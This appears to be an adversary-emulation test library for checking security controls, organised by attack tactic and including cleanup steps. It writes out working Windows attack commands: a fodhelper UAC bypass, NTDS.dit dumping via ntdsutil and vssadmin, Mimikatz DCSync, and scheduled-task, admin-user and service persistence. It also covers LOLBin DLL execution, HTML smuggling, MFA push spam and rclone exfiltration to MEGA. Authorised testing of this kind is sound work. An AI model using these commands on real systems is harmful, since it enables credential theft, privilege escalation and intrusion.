# Initial access

## Simultaneous user login - Employee login from distinct geolocations

Simultaneous logins/impossible travel arise when both a legitimate user and an adversary use the same credentials to access a systems

To simulate an impossible travel scenario of simultaneous employee logins from distinct geolocations, use a VPN geolocated dissimilarly from the geolocation of another signin source (e.g. user residence, company location).

### Notes

- When logging in, make sure to perform a full login each time. Use fresh browser sessions each time.
- Some automated detection logic may use the age of the account and its login history for determining anomalies. If the account used for testing was recently created and a detection that was expected to occur did not occur, consider using a preexisting account to login instead.



## Malicious ISOs - Generic ISO-wrapped payload

ISO archives can be used to deliver malicious payloads while bypassing mark-of-the-web restrictions

Use an ISO to deliver a malicious executable payload

### Prerequisites

1. Payload
1. ISO containing the payload 
   1. You can use `mkisofs` to create an ISO:
   ```
   bash> mkisofs -J -o {{ iso }} {{ payload }}
   ```


## MFA Push Spam - General guidance

Push-based MFA systems are susceptible to abuse by attackers because they allow an attacker to send a large volume of MFA requests to a user in order to induce that user to accept the prompt in the hopes it ends the requests.

Spam a target user with MFA approval prompts. Unlike a real-world scenario, this is not meant to test the human response to being inundated with MFA requests but rather the technical security controls for such a situation.

### Guidance

Send at least 10 MFA requests to the target user

### Notes

- If MFA is in place, but it does not use some form of zero-knowledge approval (e.g. push notification accept, SMS accept, etc), then it should be considered a block. For example, if the MFA systems requires entering a one-time code, then it would not be susceptible to this attack and therefore be blocked. If no MFA is enforced, it should be considered not blocked.

## HTML Smuggling - ISO-wrapped Exe Smuggling

Evasion technique for delivering payloads to users via HTML and JavaScript. When the user visits the HTML page, the JavaScript will initiate a download of a payload without first prompting the user.

Malicious exe contained within an ISO image delivered as an HTML smuggled file over email. Based on Nobellium (see ref #1)

### Prerequisites

1. Have an exe payload created
2. Create an ISO
   1. on Linux, you can use "mkisofs" with a command like
   > mkisofs -J -o {{ iso }} {{ exe }}
3. Base64 encode the ISO
4. Put base64 blob inside HTML smuggling document (see ref #2 for template)

### References

1. https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/
2. https://outflank.nl/blog/2018/08/14/html-smuggling-explained/

# Command and control

## Remote tool download - General guidance

Transfer tool into environment by downloading from the Internet

### Notes

- The maliciousness level of the binary should align with the intent of the test. For testing signature-based checks, use a known malicious tool, such as Mimikatz. For testing sandboxing or similar network security technologies, use an unknown yet still overtly malicious tool, such as one built around the current attack infrastructure. By default, start with the most malicious choice.

## Remote Assistance Software - General guidance

Access via remote assistance software

Select and use a well-known remote assistance software

### Prerequisites

1. An account for the service
2. Tool client downloaded and installed
   1. TeamViewer: https://www.teamviewer.com/
   2. GoTo Resolve: https://www.goto.com/it-management/resolve
   3. ConnectWise Control: https://control.connectwise.com/

### Notes

- Where possible, use remote assistance software not already in use in the environment

# Execution

# Defense evasion

## Process creation using Regsvr32 - DLL Payload

Regsvr32.exe is an abusable builtin executable in Windows

Regsvr32.exe can be used to execute arbitrary DLL payloads

### Prerequisites

- DLL that exports `DllRegisterServer`, `DllInstall`, or `DllMain`
  - Note: Without `DllRegisterServer` or `DllInstall`, there may be an error (hidden by the `/s` argument) even with otherwise successful execution

### Cleanup

Note: This will execute the payload again if the payload exports `DllUnregisterServer` and/or  `DllMain`

Remove the DLL from the registry by running `regsvr32 /u {{ dll }}`. Cleanup can be verified using a tool like `ListDlls` from Sysinternals. This command will not return output if cleanup was successful:

`cmd> ListDlls.exe | findstr /I {{ dll }}`

### References

- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32
- https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls


## UAC Bypass - via fodhelper.exe

User Account Control is not a security control but can cause issues with execution when attempting privileged operations

Move to a high-integrity execution context via fodhelper.exe and a Registry modification. Fodhelper.exe is one of many unpatched methods for bypassing UAC.

### Prerequisites

- Split-token admin account

### Guidance

Check for the existence of the target registry key. If it exists, note the value so that it can be restored after execution.

```
cmd> reg query HKCU\Software\Classes\ms-settings\Shell\Open\command
```

Modify the registry key and execute fodhelper.exe to obtain an elevated command prompt:

```
cmd> 
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "C:\windows\system32\cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /d "" /f
c:\windows\system32\fodhelper.exe
```

### Cleanup

If the registry existed prior to execution, restore its value:

```
cmd> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v {{ initial_command }} /f
```

Otherwise, delete the key:

```
cmd> reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f
```

### References

- https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
- https://4pfsec.com/offensive-windows-fodhelper-exe/


## Odbcconf - Execution using odbcconf and rsp file

The builtin odbcconf.exe binary can be abused to execute arbitrary code via a DLL payload

Execute a DLL payload by using a crafted RSP file

### Prerequisites

- DLL payload
- RSP payload
  - The contents of the RSP file should be:
    ```
    REGSVR {{ dll }}
    ```

### Guidance

The RSP file can be executed using:

```
odbcconf -f {{ rsp }}
```

### References

- https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b
- https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/


# Persistence

## Scheduled Task Persistence - via schtasks.exe

Use built-in schtasks.exe to persist by creating a scheduled task

### Guidance

```
CMD> schtasks /Create /SC DAILY /TN "{{ taskname }}" /TR "{{ command }}" /ST 09:00
```

### Cleanup

```
CMD> schtasks /delete /tn "{{ taskname }}" /f
```


## Persistence in Azure AD - Register a New Device

Register a new device in Azure AD

### Prerequisites

- Azure AD credentials
- AAD Internals PowerShell module (https://aadinternals.com/aadinternals/#installation)
  - Install: `PS> install-module aadinternals -scope currentuser`
  - Import: `PS> import-module aadinternals`

### Guidance

Authenticate to Azure AD and save the token

```
PS> Get-AADIntAccessTokenForAADJoin -SaveToCache
```

Register a device: 

```
PS> Join-AADIntDeviceToAzureAD -DeviceName "{{ device_name }}" -DeviceType "{{ device_type }}" -OSVersion "{{ os_version }}" -JoinType Register
```

  - This will save a `.pfx` certificate to the current working directory, which is needed for cleanup
  - Note: The provided values do not need to refer to real characteristics

### Cleanup

Remove the device from Azure AD 

```
PS> Remove-AADIntDeviceFromAzureAD -PfxFileName {{ pfx_certificate_file }}
```

## Windows Service Persistence - Service DLL + Registry Modification

Persist via a Windows service by creating a service DLL, modifying the Registry to register the new service, then creating a new service using sc.exe targeting svchost.exe

### Prerequisites

- Local administrator privileges
- Service DLL (see references #1 and #2) named `storesyncsvc.dll`
- Install script: https://github.com/2XXE-SRA/payload_resources/blob/master/batch/apt41.bat

### Guidance

As a local administrator, run install script in the same directory as `storesyncsvc.dll`.

### Cleanup

Delete service and registry key:

```
cmd> sc delete StorSyncSvc
cmd> reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "StorSyncSvc" /f
```

Delete DLL and BAT
- The DLL will be located at `c:\windows\system32\storesyncsvc.dll` as well as where you executed the BAT

### References

1. https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain
2. https://blog.didierstevens.com/2019/10/28/quickpost-compiling-service-dlls-with-mingw-on-kali/


## New user persistence - via net.exe

Use built-in net.exe to persist by creating a new local administrator user

### Guidance

```
- 'CMD> net user /add {{ username }} {{ password }}'
- 'CMD> net localgroup {{ group_name }} {{ username }} /add'
```

### Cleanup

```
CMD> net user /delete {{ username }}
```


# Collection

# Impact

# Credential access

## Extract NTDS.dit Credentials - via ntdsutil.exe

Dump domain hashes for all domain users on the domain controller via ntdsutil.exe, which uses Volume Shadow Services (VSS)

### Prerequisites

- Elevated command execution on a DC
- Sufficient free disk space on the DC (verify size of ntds.dit file against free disk space)

### Guidance

Note the existing snapshots before dumping NTDS.dit:

```
cmd> ntdsutil.exe snapshot "list all" quit quit
```

Dump NTDS.dit using one of the following methods, noting the snapshot number. The output path should be an empty directory:

```
cmd> ntdsutil “ac in ntds” “ifm” “cr fu {{ output_path }}” q q
```

#### Notes

In the case that ntdsutil is killed during execution (either manually or by an EDR product), the snapshots need to be cleaned up. You cannot do so using vssadmin because they are in use. Delete the snapshot with the following command, using the snapshot number from the dump command in the above guidance:

```
cmd> ntdsutil.exe snapshot "list all" "delete {{ snapshot_number }}" quit quit
```

If the command itself is blocked by a security tool, ntdsutil.exe's interactive mode can be used if executing interactively. The commands are the same but should be used one at a time:

```
cmd> ntdsutil.exe 
ntdsutil> ac in ntds 
ntdsutil> ifm 
ntdsutil> cr fu C:\path\to\ntds-dump
ntdsutil> q q
```

### Cleanup

1. Delete the snapshot if necessary (see "Notes" above)
1. Remove the NTDS.dit copy at the path you specified during execution


## Extract NTDS.dit Credentials - via vssadmin.exe

The Volume Shadow Copy Service (VSS) can be used to create a shadow copy (backup) of the data on the DC and extract NTDS.dit.

### Prerequisites

- Elevated command execution on a DC
- Sufficient free disk space on the DC (verify size of ntds.dit file against free disk space)

### Guidance

Identify the drive where NTDS is located:

 ```
 cmd> reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
 ```

   - Note: If NTDS is on a different drive than the OS, you'll need to make a snapshot for each drive

List shadows currently on the DC:

```
cmd> vssadmin list shadows
```

Create a shadow copy for the target drive(s):

```
cmd> vssadmin create shadow /for={{ drive_letter }}:
```

Copy SYSTEM hive from the shadow copy:

```
cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{{ shadow_copy_number }}\Windows\System32\config\SYSTEM {{ output_path }}\SYSTEM
```

Copy NTDS from the shadow copy:

```
cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{{ shadow_copy_number }}\NTDS\ntds.dit {{ output_path }}\NTDS.dit
```

   - Note: the path to NTDS in the shadow copy may be slightly different

### Cleanup

Delete the shadow copy(s) you created along with the copied NTDS.dit & SYSTEM files:

```
cmd> vssadmin delete shadows /shadow={{ volume_id }}
cmd> del {{ output_path }}\NTDS.dit
cmd> del {{ output_path }}\SYSTEM
```


## DCSync - via Mimikatz

The DCSync attack mimics normal replication behavior between DCs, allowing for remote extraction of credentials

Uses Mimikatz's lsadump::dcsync command

### Prerequisites

- Command execution in the context of an account with Active Directory replication rights
- User accounts to target
- Mimikatz binary (https://github.com/gentilkiwi/mimikatz)

### Guidance

```
mimikatz> lsadump::dcsync /domain:{{ domain }} /user:{{ target_username }}
```

### Troubleshooting

If Mimikatz is giving an error of `ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105 (8453)`, try the following:

```
cmd> klist purge
cmd> gpupdate /force
```


# Exfiltration

## Exfiltration with rclone - Using MEGA

Rclone is a popular utility for managing, copying, and backing up files

MEGA is a cloud file storage application and is a supported storage backend for rclone

### Prerequisites

- rclone - https://rclone.org/downloads/
- A free account at mega.io
- MEGA credentials setup on systems at `C:\Users\{{ username }}\AppData\Roaming\rclone\rclone.conf` using the format:

```
[Mega]
type = mega
user = {{ mega_username }}
pass = {{ mega_pass }}
```

### Cleanup

Remove the config file and rclone.exe from disk.

# Lateral movement

# Discovery

## AD Explorer - Enumerate Users and Groups

Active Directory Explorer is a graphical viewer and editor for Active Directory domains and is part of the Sysinternals suite

AD Explorer can be used to enumerate domain users and groups

### Prerequisites

- AD Explorer (https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer)
- Domain context for execution (e.g. a domain-joined system or a `runas /netonly` command prompt)

### Guidance

Enumerating Users and Groups:

1. Open AD Explorer and click OK when prompted to connect to Active Directory.
   - Leaving the fields blank will default to the current domain.
1. Under the default domain, right-click the domain (seen as `DC={{ domain }},DC={{ tld }}`) and choose Search Container
1. To enumerate users, add the following search parameters, then click Search:
   - Class: Organizational Unit -- organizationalUnit
   - Attribute: objectClass
   - Relation: is
   - Value: User
1. To enumerate groups, replace "User" with "Group"

